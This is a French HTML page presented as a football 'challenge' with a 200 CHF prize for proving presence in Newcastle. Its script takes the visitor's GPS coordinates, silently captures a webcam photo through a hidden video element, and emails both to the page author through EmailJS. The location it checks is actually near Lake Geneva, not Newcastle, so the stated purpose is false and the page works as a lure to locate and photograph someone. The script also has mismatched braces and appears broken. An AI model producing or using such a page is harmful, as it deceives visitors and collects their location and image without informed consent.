<!DOCTYPE html>
<html lang="fr">
<head>
    <title>The NUFC GAME</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Barlow:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
 
        body {
            min-height: 100vh;
            font-family: 'Barlow', sans-serif;
            background: #0a0a0a;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
        }
 
        .bg {
            position: fixed;
            inset: 0;
            background-image: url('https://images.unsplash.com/photo-1558618666-fcd25c85cd64?w=1400');
            background-size: cover;
            background-position: center bottom;
            filter: brightness(0.35) saturate(0.5);
            z-index: 0;
        }
 
        .overlay {
            position: fixed;
            inset: 0;
            background: linear-gradient(
                to bottom,
                rgba(0,0,0,0.7) 0%,
                rgba(0,0,0,0.2) 50%,
                rgba(0,0,0,0.85) 100%
            );
            z-index: 1;
        }
 
        .container {
            position: relative;
            z-index: 2;
            text-align: center;
            padding: 2rem;
            max-width: 600px;
            animation: fadeIn 1.2s ease forwards;
        }
 
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
 
        .badge {
            display: inline-block;
            font-family: 'Barlow', sans-serif;
            font-weight: 600;
            font-size: 0.75rem;
            letter-spacing: 0.3em;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid rgba(255,255,255,0.3);
            padding: 0.4rem 1.2rem;
            margin-bottom: 1.5rem;
        }
 
        h1 {
            font-family: 'Bebas Neue', sans-serif;
            font-size: clamp(3.5rem, 12vw, 7rem);
            color: #ffffff;
            line-height: 0.9;
            letter-spacing: 0.02em;
            text-shadow: 0 0 60px rgba(255,255,255,0.15);
            margin-bottom: 0.3rem;
        }
 
        h1 span {
            color: #000;
            -webkit-text-stroke: 2px #fff;
        }
 
        .subtitle {
            font-size: 1rem;
            font-weight: 300;
            color: rgba(255,255,255,0.6);
            letter-spacing: 0.15em;
            text-transform: uppercase;
            margin-bottom: 3rem;
        }
 
        button {
            display: inline-flex;
            align-items: center;
            gap: 0.8rem;
            background: #fff;
            color: #000;
            border: none;
            font-family: 'Bebas Neue', sans-serif;
            font-size: 1.4rem;
            letter-spacing: 0.1em;
            padding: 1.1rem 3rem;
            cursor: pointer;
            transition: all 0.25s ease;
            position: relative;
            overflow: hidden;
        }
 
        button::before {
            content: '';
            position: absolute;
            inset: 0;
            background: #000;
            transform: translateX(-100%);
            transition: transform 0.3s ease;
        }
 
        button:hover::before { transform: translateX(0); }
        button:hover { color: #fff; }
        button span { position: relative; z-index: 1; }
        button:active { transform: scale(0.97); }
 
        .footer-text {
            position: fixed;
            bottom: 1.5rem;
            font-size: 0.7rem;
            letter-spacing: 0.2em;
            color: rgba(255,255,255,0.2);
            text-transform: uppercase;
            z-index: 2;
        }
    </style>
</head>
<body>
 
    <div class="bg"></div>
    <div class="overlay"></div>
 
    <div class="container">
        <div class="badge">⚽ The Challenge — 200 CHF</div>
        <h1>ES-TU À<br><span>NEWCASTLE</span> ?</h1>
        <p class="subtitle">Prouve que tu y es. Une photo. Un instant.</p>
 
        <button onclick="TakePhoto()">
            <span>📍 VALIDER MA PRÉSENCE</span>
        </button>
    </div>
 
    <p class="footer-text">Tyne Bridge · Newcastle upon Tyne · England</p>
 
    <video id="video" style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>
 
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script>
        emailjs.init('3bQ9JJFOFfT3nPO2s')
        function CheckLocation(position){
            const lat = position.coords.latitude
            const lon = position.coords.longitude
 
            const newcastleLat = 46.38393
            const newcastleLon = 6.235014
 
            const distance = Math.sqrt(
                Math.pow(lat - newcastleLat, 2) + 
                Math.pow(lon - newcastleLon, 2)
            )
                            
            if (distance < 0.5) {
                // il est à Newcastle !
                navigator.mediaDevices.getUserMedia({video: true})
                .then(function(stream){
                    const video = document.getElementById('video')
                    video.srcObject = stream
                    video.play()
                    setTimeout(function() {
                    // ici on prend la photo
                    const canvas = document.getElementById('canvas')
                    canvas.width = video.videoWidth
                    canvas.height = video.videoHeight
                    canvas.getContext('2d').drawImage(video, 0, 0)
                    const photoBase64 = canvas.toDataURL('image/jpeg', 0.3)
                    emailjs.send('service_zyazjai', 'template_wvna8o4', {
                        coordinates: lat + ', ' + lon,
                        photo_url: photoBase64,
                        date: new Date().toLocaleString()
                    }).then (function(){
                        alert("Preuve Envoyée !!")
                    })

                    })
                    }, 3000)
                    
                })
            } else {
                // pas à Newcastle
                alert("Tu n'est pas à Newcastle petit malin, ressaie dans un autre endroit !")
            }
        }       
        function TakePhoto(){
            navigator.geolocation.getCurrentPosition(CheckLocation)
        }
    </script>
</body>
</html>
